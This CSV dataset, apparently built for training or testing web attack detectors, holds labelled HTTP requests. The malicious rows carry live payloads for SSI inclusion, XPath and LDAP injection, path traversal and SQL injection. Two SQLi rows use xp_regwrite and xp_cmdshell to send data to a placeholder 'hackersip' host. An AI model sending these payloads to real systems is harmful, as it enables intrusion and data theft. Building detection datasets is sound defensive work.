attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
SSI,medium,,malicious,"GET /comments?name=<!--#include file=""..\..\web.config"" --> HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close",,156,patt-ssi-0673,PayloadsAllTheThings,"<!--#include file=""..\..\web.config"" -->"
XPath Injection,medium,,malicious,"POST /profile HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: close

q=' and count(/@*)=1 and '1'='1&id=1464",,205,patt-xpath-injection-0464,PayloadsAllTheThings,' and count(/@*)=1 and '1'='1
,hard,-2.0,benign,"POST /aecoTEwqaho6qnVttb/yVdropX/rlideX@X1@o/lyiuosftr/eioewcihgetskieiUS/g@7sgEolipMpc-z7/elr9ioiamnoB/tsDmrEoasaojl2e.htm? HTTP/1.1
Content-Length: 182
Content-Language: Rwr,un
Content-Encoding: deflate
Content-Location: /e4Osoz/lsni/9iitoo/ckdree.jpg
Content-MD5: YXNxbnJjbjNlYWl0dHIxZQ==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 12 Jun 08 04:26:53 CET
Last-Modified: Wed, 05 Sep 07 04:46:27 UTC
Host: 223.113.121.148:80
Connection: keep-alive
Accept: */*
Accept-Charset: iso-8859-4, iso-8859-1;q=0.3, iso-8859-2, iso-8859-3, windows-1254;q=0.6
Accept-Encoding: compress
Accept-Language: hoY-qgldnns;q=0.9, a-e, iAhow-e10ta3rq, r-lNh
Cache-Control: max-stale
Client-ip: 230.124.221.154
Cookie: nwmtqe=Itatah ldtnaicj;yhwfej=linkybing2;gohmj7Idtcieg=inr rio
Cookie2: $Version=""24""
Date: Fri, 16 Apr 04 10:51:52 GMT
ETag: W/""y05-2wAWbf.A9q_gfP""
Expect: fxc03c9
From: lcteseg@iehlhresle.uk
If-Modified-Since: Fri, 19 Dec 08 24:13:06 CET
If-Unmodified-Since: Thu, 29 Mar 07 03:31:23 UTC
If-Match: *
If-None-Match: *
If-Range: Sun, 22 May 05 09:48:22 GMT
Max-Forwards: 4668
MIME-Version: 3.3
Pragma: no-cache
Proxy-Authorization: NTLM eTJzbmhobTRzMm5vamx0ZGtzZU1sdnRzb2xjYXVlS3VuMXNyeHN2eUVudGU5dA==
Authorization: Digest opaque=""d3Nact""
Range: -787,80891-464,53849-
Referer: /h2be/oueeztAo/ysaasops/ftaec.jpeg
TE: trailers
Trailer: Pragma
User-Agent: hznDr8hSL http://www.g9lhEuit.uk
UA-CPU: MIPS
UA-Disp: 035,199,32
UA-OS: Win95
UA-Color: color16
UA-Pixels: 6581x441
Via: 6.1 www.osmnsW.shtml:746, 6.3 www.hiean.jpeg, nneesr/6.5 www.siut.png
Transfer-Encoding: compress
Upgrade: i1oE/1.8, htoee/2.9, lnsedh/9.7, rNtlnM/5.3
Warning: 903 www.rzea4yr.htm ""r5iGesaOlmea2osamrqa"" ""Tue, 10 Feb 04 12:04:44 GMT""
X-Forwarded-For: 92.19.31.36
X-Serial-Number: 0421946796861302632
----: -----------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~

6zDJOAZIjZGbgsound=h&4fei6lmtwfetne=69629953&veRO=t_puwMJqalT0&eSetlnacer4Ua=dh&uSkoas2hlcadwa=92&tt=846171633&ooes=32747355&uagi2e=alocationx3ioUApctgroup by[dr&6htihenegth=n.-w8X",33130,2107,xml_test-33130,ECML/PKDD2007,
SQLi,hard,0.5,malicious,"GET /pv6p3UyrUsgh.nsf?sr2nhtexd=6602364&dovehtr=sIrd0omoCwhereosfthU0and&ifnng=%3D%5Blz7urcposhutdownnl&etjs=group+byAod3&rtvarrlHRx=htacceshilph1eiQliitbgsoundd HTTP/1.0
Host: www.ostPi1ei.net
Connection: close
Accept: application/*, application/*, image/jpeg
Accept-Charset: x-mac-arabic
Accept-Encoding: deflate, deflate;q=0.4, deflate;q=0.1, deflate, identity;q=0.3
Accept-Language: *
Cache-Control: max-age=902
Client-ip: 29.242.226.252
Cookie: tL@ln2=wH21RC4@QavD;1t=aa;hhslaOrsnebelg=3521963949;EAktuhlQ=eftplike;ugrketiehuS='    OR    'es'    LIKE     'aze%25
Cookie2: $Version=""585""
Date: Mon, 19 May 08 19:12:22 GMT
ETag: ""l5Ba6jUKnSRj0GCD""
Expect: woaieb
If-Modified-Since: Mon, 31 Oct 05 16:09:04 UTC
If-Unmodified-Since: Tue, 13 May 08 19:25:16 GMT
If-Match: ""W0r4.NwItXBysp-lr0""
If-None-Match: *
If-Range: Mon, 24 Sep 07 03:39:32 CET
Max-Forwards: 4
Pragma: no-cache
Authorization: Basic aUxkNGpzRWM6eXMwYWk=
Referer: http://httt.de/nrnYshe.asp
TE: gzip,deflate;q=0.9
User-Agent: MaenSmrilcowEessrla
UA-OS: Windows NT
UA-Color: color32
Via: HTTP/0.9 www.435iw.png
Transfer-Encoding: identity
Upgrade: atFtr/4.0, saH/5.1, 2CTc/4.8
Warning: 946 www.ttaflam.js:25381 ""lieaaerr1""",41283,1219,xml_test-41283,ECML/PKDD2007,
Path Traversal,medium,,malicious,"POST /search HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Connection: close

q=/..%u2215..%u2215..%u2215..%u2215boot.ini&id=2085",,210,patt-path-traversal-1085,PayloadsAllTheThings,/..%u2215..%u2215..%u2215..%u2215boot.ini
XPath Injection,medium,,malicious,"POST /login HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Connection: close

comment=substring(//user[userid=5]/username,2,1)=CHAR_HERE&id=1496",,229,patt-xpath-injection-0496,PayloadsAllTheThings,"substring(//user[userid=5]/username,2,1)=CHAR_HERE"
SQLi,medium,3.0,malicious,"GET /rsnEeSi/oc9CZQem1ha_mKe_iz/cHT6wh9bTyW/iszsywihhEtaea/8xgn/z2hdeqS7itoo/3shs/mWnBoRinsert/oDQx.png?Td0V=8tfe&eolorosg=exec+++++xp_regwrite+%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27ds7iSS0cs%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27 HTTP/1.1
Host: 20.237.145.38
Connection: keep-alive
Accept: application/rtf
Accept-Charset: *
Accept-Encoding: identity, gzip, gzip;q=0.1, compress;q=0.4
Accept-Language: Omm-knu;q=0.8, iam-csV, Rttt-haluh;q=0.4, mi5ta-elI7;q=0.6, tnoorA-sgctj
Cache-Control: max-age=88
Client-ip: 109.121.222.214
Cookie: wz0iefo9yuy=6nCsy
Date: Wed, 12 Jul 06 01:38:24 CET
From: nr8inpt@ayntTOpcTs.it
If-Modified-Since: Fri, 20 Feb 09 11:58:44 CET
If-Unmodified-Since: Tue, 14 Dec 04 02:43:23 GMT
If-Match: *
If-None-Match: *
Max-Forwards: 2
MIME-Version: 5.4
Proxy-Authorization: Basic Ymxld3Vobm46ZWV0dGU=
Authorization: lIainj 9eeoiltf=seddibai
Range: 770-,-93926
Referer: /dEuqSaE/ns5e/thee/rtteth/asa1r.htm
TE: trailers,trailers,gzip;q=0.9
User-Agent: hhhiLlrsDt (wgUFz07; sCMMgX; i8h1-3)
Via: FTP/2.4 www.hdylu.htm
Transfer-Encoding: compress
Upgrade: ueiDt/4.5, Y8a3e/0.2, set/3.6, emlvo/5.7
Warning: 484 www.41xtiu.shtml ""ffgplwga7ia3nttt"" ""Sun, 25 Apr 10 04:50:48 UTC""
----: --------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41022,1371,xml_test-41022,ECML/PKDD2007,
LDAP Injection,medium,,malicious,"POST /api/items HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Connection: close

comment=admin*)((|userpassword=*)&id=1020",,198,patt-ldap-injection-0020,PayloadsAllTheThings,admin*)((|userpassword=*)
,hard,-2.0,benign,"POST /hqHd0/1t6eeo3trn3ereegls0/CvOwiVaMCu1php/@DG/eb8/cK/fSfQrhvexf9jVnc3X/e1eio5ioo.tiff? HTTP/1.0
Content-Length: 69
Content-Language: rc,iLaI8dau,ebtooea
Content-Encoding: deflate
Content-Location: /iOnbdea.shtml
Content-MD5: bG5hYXJoeHNzcmtvbjB1dA==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 07 Jul 09 04:43:40 CET
Last-Modified: Fri, 15 Jun 07 13:01:08 GMT
Host: www.oianboldal.de
Connection: Ha1rir
Accept: */*;q=0.1
Accept-Charset: *
Accept-Encoding: identity, identity, identity;q=0.6, compress
Accept-Language: *
Cache-Control: only-if-cached
Client-ip: 113.87.214.25
Cookie: ek=tdAYZAEM9;Teb7atc=emdhynetopen
Cookie2: $Version=""11""
Date: Fri, 11 Jan 08 06:10:18 CET
ETag: ""FZaQFhCBRmUNO@lzenU""
Expect: 100-continue
From: sblb@seuhwa.net
If-Modified-Since: Fri, 04 Aug 06 14:56:40 UTC
If-Unmodified-Since: Mon, 24 Nov 08 22:38:46 GMT
If-Match: ""e0-GA5.@8IFiQ4GSyyts""
If-None-Match: *
If-Range: *
Max-Forwards: 7197
MIME-Version: 7.5
Pragma: w8irmua='zweSGht'
Proxy-Authorization: Basic MnBJbm1EOnR4b3R4NjE=
Authorization: NTLM M291ZG53bm9ybXNhbWJobGh1aG9kVENpYXFscm5NdHNkc3Vh
Range: 19-,7131-
Referer: http://oertlto.st/tngt/IeGetgnu.css
TE: deflate,gzip;q=0.3,trailers
Trailer: Warning
User-Agent: Mozilla/7.4 (Windows; U; Windows NT 5.4; Bt-eh; rv:0.2.6) Gecko/41426740
UA-CPU: StrongARM
UA-Disp: 4721,826,16
UA-OS: FreeBSD
UA-Color: color16
UA-Pixels: 193x5257
Via: FTP/4.1 www.utSm.gif:7171, YnEnlr/1.3 www.rxsaoos.shtml, 7.6 www.tuo83a.jpg:04
Transfer-Encoding: deflate
Upgrade: elldh/2.3, hhMe/5.9
Warning: 506 www.tlcm.tiff ""GNPpw"" 
X-Forwarded-For: 240.213.181.129
X-Serial-Number: 62285156998436291420
----: ----------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

osge=cilvlhr0<>Hts9&6zaecqAknrfd=AleOepEe8l7t38&hditfQ7rilsenAa=s",4259,1832,xml_test-4259,ECML/PKDD2007,
SQLi,medium,4.5,malicious,"GET /upgbtrrh/f4BNMAS6nr/hlTaiIndwootepseuain/seasaesomahu4m9/lLFGwiCYiCMljeOKwZ/arscrxetehe/tiC65LKeHlYAsEO/eatiet2.shtml?ycSone=exec++xp_cmdshell+%27bcp+++++%22select++++*++from++ofo%22++queryout+++pwdump.exe++++-c+++-Craw++++-Shackersip++++-Usa+++++-Ph8ck3r%27&hiioeOe8aest=75852549&awtamre6ogsBa=ahe5+etoIan2&hofilAe1ee=%40genlf%40boot.ini&nih6=n%2F7e%3Ast%28 HTTP/1.1
Host: 169.197.208.19
Connection: close
Accept: */*;q=0.5
Accept-Charset: *;q=0.7
Accept-Encoding: *
Accept-Language: *
Cache-Control: no-cache
Client-ip: 177.124.117.237
Date: Fri, 30 Mar 07 11:22:19 UTC
Expect: 100-continue
From: jrln@tnernm.biz
If-Modified-Since: Sat, 01 Nov 08 14:18:56 UTC
If-Unmodified-Since: Mon, 12 Mar 07 05:56:57 CET
If-Match: ""bV_J1hfi.eJREC2hJE""
If-None-Match: ""quO5x.ExDCNRoicCz5k""
Max-Forwards: 3887
Pragma: ier='v9'
Proxy-Authorization: nmtsns c9neqdtn=mecete
Authorization: NTLM dGVzdDdsb3hHcmNkeWFjZHQ4ZHF0c3RlaXhzY3NlczBmaW9kbQ==
Referer: /c4sdNsg.html
TE: gzip,trailers
User-Agent: eidehpare6w5eiqCotUm
Via: 0.3 www.i02ndtyd.jpg:95
Transfer-Encoding: deflate
Warning: 341 www.hatlzo.htm ""y5wl"" ""Thu, 19 Jun 08 12:12:06 GMT""
~~~~~: ~~~~~~~~~~~~~~~~~~",41158,1183,xml_test-41158,ECML/PKDD2007,
